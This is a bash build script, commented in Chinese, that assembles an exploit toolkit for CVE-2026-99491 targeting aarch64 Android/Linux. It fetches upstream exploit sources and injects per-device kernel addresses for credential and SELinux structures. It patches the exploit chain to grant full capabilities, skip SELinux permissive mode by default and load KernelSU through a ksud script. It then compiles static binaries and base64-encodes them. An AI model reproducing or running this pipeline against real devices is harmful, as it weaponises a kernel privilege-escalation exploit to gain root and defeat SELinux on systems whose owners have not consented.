#!/usr/bin/env bash
# 构建 CVE-2026-99491 工具集（上游 GPL-2.0 源码 + 本机常量 + 本机策略补丁）。
#
# 用法：tools/build_cve99491.sh <输出目录>
#
# 需要：curl、tar、zig（或 zig 在 PATH）、python3。产物为 aarch64-linux-musl 静态件。
set -euo pipefail

OUT=${1:?用法: $0 <输出目录>}
ROOT=$(cd "$(dirname "$0")/.." && pwd)
LOCK="$ROOT/tools/cve99491.lock.properties"
CACHE=${CVE99491_CACHE:-$PWD/.cve99491-cache}

get() { sed -n "s/^$1=//p" "$LOCK" | head -1; }

REPO=$(get repo); COMMIT=$(get commit); URL=$(get url)
WANT_SIZE=$(get size); WANT_SHA=$(get sha256)
LINK_ADD_WORKER=$(get link_add_worker)
LINK_SELINUX=$(get link_selinux)
LINK_BOOTID=$(get link_bootid)
CRED_SITE=$(get cred_site_low21)
BLOB_A=$(get blob_site_a)
BLOB_B=$(get blob_site_b)

for v in REPO COMMIT URL WANT_SIZE WANT_SHA LINK_ADD_WORKER LINK_SELINUX LINK_BOOTID CRED_SITE; do
  if [ -z "${!v}" ]; then
    echo "::error::lock 文件缺少 $v"
    exit 1
  fi
done

mkdir -p "$OUT" "$CACHE"
TAR="$CACHE/99491-$COMMIT.tar.gz"
SRC="$CACHE/src-$COMMIT"

if [ ! -d "$SRC/tools" ]; then
  if [ ! -f "$TAR" ]; then
    echo "下载 $URL"
    curl -fsSL "$URL" -o "$TAR"
  fi
  got_size=$(stat -c%s "$TAR")
  got_sha=$(sha256sum "$TAR" | awk '{print $1}')
  if [ "$got_size" != "$WANT_SIZE" ] || [ "$got_sha" != "$WANT_SHA" ]; then
    echo "::error::上游 tarball 校验失败：size=$got_size sha256=$got_sha"
    exit 1
  fi
  echo "tarball 校验通过（$got_size 字节）"
  rm -rf "$SRC"
  mkdir -p "$SRC"
  tar -xzf "$TAR" -C "$SRC" --strip-components=1
fi

T="$SRC/tools"
[ -f "$T/ctest.c" ] || { echo "::error::tarball 结构异常：缺 tools/ctest.c"; exit 1; }

# —— 常量注入（表驱动：每项都必须命中）——
patch_macro() {
  local file=$1 name=$2 value=$3
  if ! grep -qE "^#define[[:space:]]+$name[[:space:]]" "$file"; then
    echo "::error::$file 里找不到 #define $name"
    exit 1
  fi
  sed -i -E "s|^#define[[:space:]]+$name[[:space:]]+.*|#define $name ${value}ULL|" "$file"
}

echo "注入本机常量："
for f in wtest.c ctest.c; do
  patch_macro "$T/$f" LINK_ADD_WORKER "$LINK_ADD_WORKER"
  patch_macro "$T/$f" LINK_SELINUX_STATE "$LINK_SELINUX"
done
patch_macro "$T/wtest.c" LINK_BOOTID "$LINK_BOOTID"
patch_macro "$T/ctest.c" CRED_SITE_LOW21 "$CRED_SITE"
if [ "$BLOB_A" = "0x0" ]; then
  echo "::error::BLOB_SITE_* 未测出"
  exit 1
fi
patch_macro "$T/ctest.c" BLOB_SITE_A "$BLOB_A"
patch_macro "$T/ctest.c" BLOB_SITE_B "$BLOB_B"
grep -E "^#define[[:space:]]+(LINK_|CRED_SITE|BLOB_SITE)" "$T/ctest.c" | sed 's/^/  ctest.c: /'

# —— 策略补丁：补能力位、permissive 改为按需、loadksu 换成 ksud ——
# 注意：fast 链与 all 链里这些代码各出现一次，期望次数必须写对，
# 否则补丁会在"命中 2 次"这种地方失败（第一版就栽在这）。
python3 - "$T/ctest.c" <<'PY'
import sys, io

path = sys.argv[1]
src = io.open(path, encoding="utf-8").read()

def sub_n(text, old, new, what, want=1):
    n = text.count(old)
    if n != want:
        raise SystemExit("补丁失败：%s 期望 %d 次，实际 %d 次" % (what, want, n))
    return text.replace(old, new)

# 1) 补全能力位（含 CAP_SYSLOG，ksud 才能自己读 kallsyms 重定位）
src = sub_n(
    src,
    "    patch_agent(pid, cred, 0, 1);\n",
    "    patch_agent(pid, cred, 0, 1);\n    patch_full_caps(pid, cred);\n",
    "chain_fast 补 patch_full_caps",
    1,
)

# 2) permissive 默认跳过（fast 链 + all 链各一处）
src = sub_n(
    src,
    "    if (try_permissive(st) < 0) {",
    "    if (getenv(\"C99491_PERMISSIVE\") && try_permissive(st) < 0) {",
    "try_permissive 条件化",
    2,
)

# 3) 装载方式：手工符号表 -> ksud late-load（两处）
src = sub_n(
    src,
    "        int n = snprintf(c, sizeof(c), \"loadksu %#llx allow_shell=1\\n\", slide);",
    "        int n = snprintf(c, sizeof(c), \"run /data/local/tmp/ksud_go.sh\\n\");",
    "loadksu -> run ksud_go.sh",
    2,
)

io.open(path, "w", encoding="utf-8").write(src)
print("策略补丁已应用：patch_full_caps / permissive 按需 / ksud 装载")
PY

# —— Android system_properties 垫片 ——
mkdir -p "$T/compat/sys"
cat > "$T/compat/sys/system_properties.h" <<'EOF'
#ifndef CVE99491_COMPAT_SYSTEM_PROPERTIES_H
#define CVE99491_COMPAT_SYSTEM_PROPERTIES_H
#define PROP_VALUE_MAX 92
int __system_property_get(const char *key, char *value);
int __system_property_set(const char *key, const char *value);
#endif
EOF
cat > "$T/compat_sp.c" <<'EOF'
/* 非 bionic 目标下的空实现。 */
#define PROP_VALUE_MAX 92
int __system_property_get(const char *key, char *value)
{
	(void)key;
	if (value)
		value[0] = 0;
	return 0;
}
int __system_property_set(const char *key, const char *value)
{
	(void)key; (void)value;
	return -1;
}
EOF

CC=${CC:-zig cc}
CFLAGS=(-target aarch64-linux-musl -std=gnu11 -O2 -static -s -pthread
        -ffunction-sections -fdata-sections -Wl,--gc-sections
        -fno-asynchronous-unwind-tables -fno-unwind-tables
        -I"$T" -I"$T/compat")

build() {
  local name=$1; shift
  echo "== $name"
  # shellcheck disable=SC2068
  $CC "${CFLAGS[@]}" "$@" "$T/compat_sp.c" -o "$OUT/$name"
  ls -l "$OUT/$name"
}

build site_probe "$ROOT/plant/cve99491/site_probe.c"
build wtest      "$T/wtest.c"
build ctest      "$T/ctest.c"
build agent      "$T/agent.c"
build capdump    "$T/capdump.c"
build evread     "$T/evread.c"
build hold       "$T/hold.c"
build tinycred   "$T/tinycred.c"

{
  echo "upstream=$REPO@$COMMIT"
  echo "link_add_worker=$LINK_ADD_WORKER"
  echo "link_selinux=$LINK_SELINUX"
  echo "link_bootid=$LINK_BOOTID"
  echo "cred_site_low21=$CRED_SITE"
  echo "blob_site_a=$BLOB_A"
  echo "blob_site_b=$BLOB_B"
  echo "patches=full_caps,permissive-optional,ksud-load"
  echo "built_at=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
  for f in "$OUT"/*; do
    case "$f" in *.b64|*.txt) continue;; esac
    echo "$(basename "$f") $(stat -c%s "$f") $(sha256sum "$f" | awk '{print $1}')"
  done
} > "$OUT/BUILDINFO.txt"
cat "$OUT/BUILDINFO.txt"

for f in "$OUT"/*; do
  case "$f" in *.b64|*.txt) continue;; esac
  base64 -w0 "$f" > "$OUT/$(basename "$f").b64"
done
echo "已生成 $(ls "$OUT"/*.b64 | wc -l) 个 base64 文件"
